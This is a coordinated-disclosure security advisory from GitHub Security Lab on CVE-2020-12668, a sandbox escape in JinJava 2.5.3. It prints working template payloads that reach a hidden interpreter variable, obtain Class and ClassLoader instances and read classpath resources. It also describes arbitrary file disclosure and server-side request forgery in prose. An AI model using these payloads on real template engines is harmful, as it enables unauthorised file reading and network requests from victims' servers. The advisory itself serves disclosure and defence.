<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 29, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-072: Arbitrary file disclosure in JinJava - CVE-2020-12668</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>A user with privileges to write JinJava templates, for example in a CMS context, will be able to read arbitrary files from the file system.</p>

<h2 id="product">Product</h2>
<p>JinJava</p>

<h2 id="tested-version">Tested Version</h2>
<p>2.5.3</p>

<h2 id="details">Details</h2>

<h3 id="unauthorized-access-to-class-instance">Unauthorized access to <code class="language-plaintext highlighter-rouge">Class</code> instance</h3>

<p>JinJava does a great job preventing access to <code class="language-plaintext highlighter-rouge">Class</code> instances. It will prevent any access to a <code class="language-plaintext highlighter-rouge">Class</code> property or invocation of any methods returning a <code class="language-plaintext highlighter-rouge">Class</code> instance. However, it does not prevent Array or Map accesses returning a <code class="language-plaintext highlighter-rouge">Class</code> instance. Therefore, it should be possible to get an instance of <code class="language-plaintext highlighter-rouge">Class</code> if we find a method returning <code class="language-plaintext highlighter-rouge">Class[]</code> or <code class="language-plaintext highlighter-rouge">Map&lt;?, Class&gt;</code>.</p>

<h3 id="interpreter-access">Interpreter access</h3>
<p>JinJava has another vulnerability, it exposes the internal JinJava interpreter through the <strong>secret</strong> <code class="language-plaintext highlighter-rouge">____int3rpr3t3r____</code> variable. Having access to the interpreter, we can do a variety of things. For example, we can list all variables in the template context which may give us access to undocumented objects.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% for key in ____int3rpr3t3r____.getContext().entrySet().toArray() %}
    {{key.getKey()}} - {{key.getValue()}}
{% endfor %}
</code></pre></div></div>

<p>It also give access to all filters, functions and tags:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% for key in ____int3rpr3t3r____.getContext(). getAllFunctions().toArray() %}
    {{key }}
{% endfor %}

{% for key in ____int3rpr3t3r____.getContext().getAllTags().toArray() %}
    {{key }}
{% endfor %}

{% for key in ____int3rpr3t3r____.getContext().getAllFilters().toArray() %}
    {{key.getName() }}
{% endfor %}
</code></pre></div></div>

<p>Functions are particularly interesting since they give us access to <code class="language-plaintext highlighter-rouge">java.lang.reflect.Method</code> instances. From a <code class="language-plaintext highlighter-rouge">Method</code> we can get arrays of their exception and parameter types:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% for key in ____int3rpr3t3r____.getContext().getAllFunctions().toArray() %}
    {{{key}} - {{key.getName()}} - {% for exc in key.getMethod().getExceptionTypes() %}{{exc}},{% endfor %} - {% for param in key.getMethod().getParameterTypes() %}{{param}},{% endfor %}
{% endfor %}
</code></pre></div></div>

<p>With that we can finally access <code class="language-plaintext highlighter-rouge">Class</code> instances. E.g:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set class = ____int3rpr3t3r____.getContext().getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
{{ class }}
</code></pre></div></div>

<h3 id="classloader-access">ClassLoader access</h3>
<p>Once we have access to a <code class="language-plaintext highlighter-rouge">Class</code> instance we can also get access to a <code class="language-plaintext highlighter-rouge">ClassLoader</code> instance through the <code class="language-plaintext highlighter-rouge">protectionDomain</code> since direct access from <code class="language-plaintext highlighter-rouge">Class.getClassLoader()</code> is forbidden.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set classLoader = class.getProtectionDomain().getClassLoader() %}
{{ classLoader }}&lt;br/&gt;
</code></pre></div></div>

<h3 id="arbitrary-classpath-resource-disclosure">Arbitrary Classpath Resource Disclosure</h3>

<p>Using the <code class="language-plaintext highlighter-rouge">Class</code> or <code class="language-plaintext highlighter-rouge">ClassLoader</code> instances we can get access to Classpath resources with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{% set class = ____int3rpr3t3r____.getContext().getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
{% set is = class.getResourceAsStream("/Foo.class") %}
{% for I in range(999) %} {% set byte = is.read() %} {{ byte }}, {% endfor %}
</code></pre></div></div>

<h3 id="arbitrary-file-disclosure">Arbitrary File Disclosure</h3>

<p>We can finally get access to arbitrary File System files by retrieving Classpath resource as an <code class="language-plaintext highlighter-rouge">URL</code>, and then converting it to an <code class="language-plaintext highlighter-rouge">URI</code> since this class contains an static <code class="language-plaintext highlighter-rouge">create()</code> method that will allow us to create arbitrary <code class="language-plaintext highlighter-rouge">URI</code>s. Once that we have an <code class="language-plaintext highlighter-rouge">URI</code> pointing to the resource we want to access, we can open a connection and read its content from an input stream.</p>

<h3 id="server-side-request-forgery">Server-Side Request Forgery</h3>
<p>We can use a different protocol such as <code class="language-plaintext highlighter-rouge">http</code>, <code class="language-plaintext highlighter-rouge">https</code> or <code class="language-plaintext highlighter-rouge">ftp</code> to establish a network connection and initiate a Server-Side request forgery attack.</p>

<h4 id="impact">Impact</h4>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Arbitrary File Disclosure</code>.</p>

<h2 id="cve">CVE</h2>

<p>CVE-2020-12668</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<p>This report was subject to the GHSL <a href="https://securitylab.github.com/advisories/#policy">coordinated disclosure policy</a>.</p>
<ul>
  <li>04/15/2020: Report sent to vendor</li>
  <li>05/04/2020: Issue is fixed in version 2.5.4</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-072</code> in any communication regarding this issue.</p>

   